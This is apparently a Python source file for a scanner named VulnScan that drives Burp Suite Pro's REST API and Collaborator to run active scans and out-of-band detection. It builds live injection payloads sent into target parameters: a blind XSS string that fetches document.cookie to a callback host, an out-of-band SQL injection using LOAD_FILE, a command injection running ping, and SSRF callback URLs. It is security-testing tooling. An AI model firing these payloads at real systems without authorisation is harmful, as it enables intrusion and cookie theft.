"""
VulnScan — Burp Suite Pro Full Integration
Level 1: Proxy routing
Level 2: REST API — active scan trigger, issue import, sitemap sync
Level 3: Collaborator — blind SSRF, blind XSS, OOB SQLi real-time
"""
import asyncio
import httpx
import json
import time
import uuid
import re
from typing import List, Dict, Optional, Any
from urllib.parse import urlparse, urlencode, parse_qs
from database.models import Finding


# ══════════════════════════════════════════════════════════════════
# BURP REST API CLIENT
# ══════════════════════════════════════════════════════════════════

class BurpAPIClient:
    """
    Talks to Burp Suite Pro REST API (port 1337 by default)
    Enable in: Burp → User Options → Misc → REST API → Enable
    """

    def __init__(self, api_url: str = "http://127.0.0.1:1337",
                 api_key: str = "", logger=None):
        self.base = api_url.rstrip("/")
        self.api_key = api_key
        self.log = logger
        self._client = httpx.AsyncClient(timeout=30, verify=False)

    def _headers(self) -> dict:
        h = {"Content-Type": "application/json", "Accept": "application/json"}
        if self.api_key:
            h["Authorization"] = self.api_key
        return h

    async def is_alive(self) -> bool:
        try:
            r = await self._client.get(f"{self.base}/v0.1/", headers=self._headers())
            return r.status_code < 500
        except Exception:
            return False

    # ── Scan Control ────────────────────────────────────────────

    async def start_active_scan(self, url: str,
                                 config: dict = None) -> Optional[str]:
        """Trigger Burp active scan on a URL — returns task ID"""
        payload = {
            "urls": [url],
            "scope": {
                "include": [{"rule": url, "type": "SimpleScopeDef"}],
                "exclude": []
            },
            "scan_configurations": config or [{
                "name": "Audit checks - all except Java deserialization scans",
                "type": "NamedConfiguration"
            }],
            "resource_pool": "Default resource pool",
        }
        try:
            r = await self._client.post(
                f"{self.base}/v0.1/scan",
                json=payload, headers=self._headers()
            )
            if r.status_code == 201:
                location = r.headers.get("location", "")
                task_id = location.split("/")[-1]
                if self.log:
                    self.log.success(f"Burp scan started: {url} (task={task_id})")
                return task_id
        except Exception as e:
            if self.log:
                self.log.warn(f"Burp scan start failed: {e}")
        return None

    async def get_scan_status(self, task_id: str) -> dict:
        try:
            r = await self._client.get(
                f"{self.base}/v0.1/scan/{task_id}",
                headers=self._headers()
            )
            return r.json() if r.status_code == 200 else {}
        except Exception:
            return {}

    async def wait_for_scan(self, task_id: str,
                             timeout: int = 300) -> List[dict]:
        """Wait for Burp scan to finish, return issues"""
        if self.log:
            self.log.info(f"Waiting for Burp scan {task_id}...")
        start = time.time()
        while time.time() - start < timeout:
            status = await self.get_scan_status(task_id)
            phase = status.get("scan_status", "")
            pct = status.get("scan_metrics", {}).get("crawl_and_audit_progress", 0)
            if self.log:
                self.log.info(f"Burp scan: {phase} — {pct}%")
            if phase in ("succeeded", "failed"):
                return status.get("issue_events", [])
            await asyncio.sleep(10)
        return []

    async def get_all_issues(self) -> List[dict]:
        """Get all issues from Burp's issue log"""
        try:
            r = await self._client.get(
                f"{self.base}/v0.1/issue-definitions",
                headers=self._headers()
            )
            return r.json() if r.status_code == 200 else []
        except Exception:
            return []

    async def get_scan_issues(self, task_id: str) -> List[dict]:
        """Get issues from a specific scan task"""
        status = await self.get_scan_status(task_id)
        return status.get("issue_events", [])

    # ── Sitemap ─────────────────────────────────────────────────

    async def get_sitemap(self, url_prefix: str = "") -> List[dict]:
        """Pull Burp proxy sitemap — all URLs it has seen"""
        try:
            params = f"?urlPrefix={url_prefix}" if url_prefix else ""
            r = await self._client.get(
                f"{self.base}/v0.1/target/sitemap{params}",
                headers=self._headers()
            )
            return r.json() if r.status_code == 200 else []
        except Exception:
            return []

    async def extract_urls_from_sitemap(self, target: str) -> List[str]:
        """Extract all unique URLs from Burp sitemap for a target"""
        sitemap = await self.get_sitemap(target)
        urls = []
        for item in sitemap:
            url = item.get("url", "")
            if url:
                urls.append(url)
        if self.log:
            self.log.success(f"Burp sitemap: {len(urls)} URLs for {target}")
        return list(set(urls))

    # ── Scope ────────────────────────────────────────────────────

    async def add_to_scope(self, url: str) -> bool:
        try:
            payload = {"action": "include", "url": url}
            r = await self._client.put(
                f"{self.base}/v0.1/target/scope",
                json=payload, headers=self._headers()
            )
            return r.status_code == 200
        except Exception:
            return False

    async def check_in_scope(self, url: str) -> bool:
        try:
            r = await self._client.get(
                f"{self.base}/v0.1/target/scope?url={url}",
                headers=self._headers()
            )
            data = r.json()
            return data.get("in_scope", False)
        except Exception:
            return False

    async def close(self):
        await self._client.aclose()


# ══════════════════════════════════════════════════════════════════
# BURP COLLABORATOR CLIENT
# ══════════════════════════════════════════════════════════════════

class BurpCollaboratorClient:
    """
    Burp Suite Pro Collaborator integration.
    Used for: blind SSRF, blind XSS, OOB SQLi, blind CMDi detection.

    Setup:
    1. Burp → Project → Collaborator → Use Burp Collaborator
    2. Get your payload host (e.g. abcdef.burpcollaborator.net)
    3. Poll for interactions via Burp REST API

    Alternative: Use interactsh (free, self-hosted)
    """

    def __init__(self, collaborator_host: str = "",
                 burp_api: BurpAPIClient = None,
                 logger=None):
        self.host = collaborator_host  # e.g. abcxyz.burpcollaborator.net
        self.burp_api = burp_api
        self.log = logger
        self._interactions: List[dict] = []
        self._payloads_sent: Dict[str, dict] = {}  # id → {url, param, type}

    def generate_payload(self, vuln_type: str, url: str,
                          param: str = "") -> str:
        """Generate unique collaborator URL for a test"""
        uid = uuid.uuid4().hex[:8]
        payload_url = f"http://{uid}.{self.host}/"
        self._payloads_sent[uid] = {
            "id": uid,
            "vuln_type": vuln_type,
            "url": url,
            "param": param,
            "time": time.time(),
        }
        return payload_url

    def generate_xss_payload(self, url: str, param: str = "") -> str:
        """Generate blind XSS payload that calls back to collaborator"""
        uid = uuid.uuid4().hex[:8]
        callback = f"http://{uid}.{self.host}/"
        self._payloads_sent[uid] = {
            "id": uid,
            "vuln_type": "Blind XSS",
            "url": url,
            "param": param,
            "time": time.time(),
        }
        # XSS payload that loads image from collaborator
        xss = f'"><img src="{callback}" onerror="fetch(\'{callback}\'+document.cookie)">'
        return xss, callback

    async def poll_interactions(self, wait_seconds: int = 30) -> List[dict]:
        """
        Poll Burp for any callbacks received.
        Returns list of confirmed blind vulnerabilities.
        """
        if self.log:
            self.log.info(f"Polling Burp Collaborator for {wait_seconds}s...")

        confirmed = []
        await asyncio.sleep(wait_seconds)

        # Poll via Burp REST API
        if self.burp_api:
            try:
                r = await self.burp_api._client.get(
                    f"{self.burp_api.base}/v0.1/collaborator/interactions",
                    headers=self.burp_api._headers()
                )
                if r.status_code == 200:
                    interactions = r.json()
                    for interaction in interactions:
                        iid = interaction.get("interaction_id", "")[:8]
                        meta = self._payloads_sent.get(iid)
                        if meta:
                            confirmed.append({
                                "type": meta["vuln_type"],
                                "url": meta["url"],
                                "param": meta["param"],
                                "interaction": interaction,
                                "protocol": interaction.get("type", "HTTP"),
                            })
                            if self.log:
                                self.log.vuln(
                                    meta["vuln_type"], "Critical",
                                    meta["url"],
                                    f"Blind callback confirmed via Collaborator! param={meta['param']}"
                                )
            except Exception as e:
                if self.log:
                    self.log.warn(f"Collaborator poll error: {e}")

        return confirmed

    def get_all_payload_ids(self) -> List[str]:
        return list(self._payloads_sent.keys())


# ══════════════════════════════════════════════════════════════════
# ISSUE CONVERTER — Burp issues → VulnScan Findings
# ══════════════════════════════════════════════════════════════════

BURP_SEVERITY_MAP = {
    "high": "High",
    "medium": "Medium",
    "low": "Low",
    "information": "Info",
    "false_positive": "Info",
    "critical": "Critical",
}

BURP_TYPE_MAP = {
    "Cross-site scripting": "XSS",
    "SQL injection": "SQL Injection",
    "OS command injection": "Command Injection",
    "Path traversal": "LFI",
    "XML injection": "XXE",
    "SSRF": "SSRF",
    "Open redirection": "Open Redirect",
    "Clickjacking": "Clickjacking",
    "CORS": "CORS",
    "Information disclosure": "Info Disclosure",
    "Broken access control": "IDOR",
}


def convert_burp_issues(burp_issues: List[dict]) -> List[Finding]:
    """Convert Burp scan issues to VulnScan Finding objects"""
    findings = []
    for issue in burp_issues:
        # Handle both direct issues and event-wrapped
        if "issue" in issue:
            issue = issue["issue"]

        name = issue.get("name", "Unknown")
        severity = BURP_SEVERITY_MAP.get(
            issue.get("severity", "").lower(), "Medium"
        )
        url = issue.get("origin", "") + issue.get("path", "")
        detail = issue.get("detail", "")
        background = issue.get("issueBackground", "")
        remediation = issue.get("remediationBackground", "")

        # Map to VulnScan type
        vuln_type = name
        for burp_name, vs_name in BURP_TYPE_MAP.items():
            if burp_name.lower() in name.lower():
                vuln_type = vs_name
                break

        f = Finding(
            vuln_type=vuln_type,
            severity=severity,
            url=url,
            method="GET",
            evidence=detail[:300] if detail else background[:300],
            description=f"[Burp Scanner] {name}: {background[:200]}",
            remediation=remediation[:300] if remediation else "",
            tool="Burp Suite Pro",
        )
        findings.append(f)
    return findings


# ══════════════════════════════════════════════════════════════════
# AGGRESSIVE BURP SCANNER — orchestrates everything
# ══════════════════════════════════════════════════════════════════

class AggressiveBurpScanner:
    """
    Full aggressive scanner using Burp Pro:
    1. Add target to Burp scope
    2. Pull sitemap URLs Burp has already crawled
    3. Trigger Burp active scan on all endpoints
    4. Run VulnScan blind detection via Collaborator
    5. Collect and merge all findings
    """

    def __init__(self, http_client, burp_api: BurpAPIClient,
                 collaborator: BurpCollaboratorClient = None,
                 logger=None):
        self.http = http_client
        self.burp = burp_api
        self.collab = collaborator
        self.log = logger
        self.findings: List[Finding] = []

    async def full_scan(self, target: str,
                         extra_urls: List[str] = None) -> List[Finding]:
        """Run complete aggressive scan with all Burp features"""
        if self.log:
            self.log.info("=" * 50)
            self.log.info("BURP PRO AGGRESSIVE SCAN STARTING")
            self.log.info("=" * 50)

        # 1. Verify Burp is running
        if not await self.burp.is_alive():
            if self.log:
                self.log.error("Burp Suite not reachable at " + self.burp.base)
                self.log.error("Check: Burp → User Options → Misc → REST API → Enabled")
            return []

        if self.log:
            self.log.success("Burp Suite Pro connected!")

        # 2. Add target to scope
        await self.burp.add_to_scope(target)
        if self.log:
            self.log.info(f"Added to Burp scope: {target}")

        # 3. Get URLs from Burp sitemap (if Burp was already used as proxy)
        sitemap_urls = await self.burp.extract_urls_from_sitemap(target)

        # Merge with VulnScan crawled URLs
        all_urls = list(set(sitemap_urls + (extra_urls or [target])))
        if self.log:
            self.log.info(f"Total URLs to scan: {len(all_urls)}")

        # 4. Trigger Burp active scan on discovered URLs
        task_ids = []
        # Scan in batches of 10
        for url in all_urls[:50]:
            task_id = await self.burp.start_active_scan(url)
            if task_id:
                task_ids.append(task_id)
            await asyncio.sleep(0.5)

        if self.log:
            self.log.info(f"Burp active scans started: {len(task_ids)}")

        # 5. Run blind detection via Collaborator (parallel to Burp scan)
        blind_tasks = []
        if self.collab and self.collab.host:
            for url in all_urls[:30]:
                if "?" in url:
                    blind_tasks.append(
                        self._run_blind_detection(url)
                    )
            if blind_tasks:
                await asyncio.gather(*blind_tasks, return_exceptions=True)

        # 6. Wait for Burp scans to complete and collect issues
        if self.log:
            self.log.info("Waiting for Burp active scans...")

        for task_id in task_ids[:5]:  # Monitor top 5 tasks
            issues = await self.burp.wait_for_scan(task_id, timeout=120)
            burp_findings = convert_burp_issues(issues)
            self.findings.extend(burp_findings)
            if self.log and burp_findings:
                self.log.success(
                    f"Burp task {task_id}: {len(burp_findings)} issues found")

        # 7. Poll Collaborator for blind callbacks
        if self.collab and self.collab.host and blind_tasks:
            confirmed = await self.collab.poll_interactions(wait_seconds=20)
            for conf in confirmed:
                f = Finding(
                    vuln_type=f"Blind {conf['type']} (OOB Confirmed)",
                    severity="Critical",
                    url=conf["url"],
                    method="GET",
                    parameter=conf["param"],
                    evidence=f"Burp Collaborator callback received via {conf['protocol']}",
                    description=f"Out-of-band {conf['type']} confirmed via Burp Collaborator — interaction ID received",
                    tool="Burp Collaborator",
                )
                self.findings.append(f)

        if self.log:
            self.log.success(
                f"Burp aggressive scan complete — {len(self.findings)} total findings")
        return self.findings

    async def _run_blind_detection(self, url: str):
        """Send blind detection payloads via Collaborator"""
        if not self.collab:
            return

        parsed = urlparse(url)
        qs = parse_qs(parsed.query) if parsed.query else {}
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in qs:
            orig_qs = {k: (v[0] if isinstance(v, list) else v)
                       for k, v in qs.items()}

            # Blind SSRF
            ssrf_payload = self.collab.generate_payload("Blind SSRF", url, param)
            test_qs = orig_qs.copy()
            test_qs[param] = ssrf_payload
            await self.http.get(base + "?" + urlencode(test_qs))

            # Blind XSS (for string params)
            xss_payload, _ = self.collab.generate_xss_payload(url, param)
            test_qs[param] = xss_payload
            await self.http.get(base + "?" + urlencode(test_qs))

            # Blind SQLi (OOB via DNS)
            sqli_oob = f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({self.collab.generate_payload('OOB SQLi', url, param)}),'\\\\test')))-- -"
            test_qs[param] = orig_qs[param] + sqli_oob
            await self.http.get(base + "?" + urlencode(test_qs))

            # Blind CMDi
            cmdi_oob = f"; ping -c 1 {self.collab.generate_payload('Blind CMDi', url, param).replace('http://', '').rstrip('/')}"
            test_qs[param] = orig_qs[param] + cmdi_oob
            await self.http.get(base + "?" + urlencode(test_qs))
